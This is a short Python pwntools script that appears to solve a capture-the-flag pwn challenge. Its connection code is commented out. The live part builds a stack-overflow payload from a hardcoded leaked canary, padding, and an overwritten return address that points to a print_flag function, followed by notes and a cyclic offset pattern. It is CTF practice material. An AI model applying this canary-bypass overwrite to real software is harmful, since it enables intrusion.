from pwn import *

# re = remote('hexv.challs.pwnoh.io', 1337, ssl=True)


# print(re.recvall(timeout=2).decode())

# re.sendline(b'funcs')

# funcs = re.recvall(timeout=2).decode()
# print(funcs)
# func_addr = funcs.split('\n')[3].split(' ')[0]
# print(f"print_flag add {func_addr}")


# re.sendline(b'dump')


cann = "0033baf7f8a09f7e"
# re.interactive()
addr = 0x56373c84a2e9
ret = "0100000002000000"
print((112 * 2 + 16) * '0' + cann + 16 * '0' + p64(addr).hex() + ret + p64(addr).hex())


#addr 0x55e7696442e9
#cana 00 b1 5b 17  1c 64 5b b3

#aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab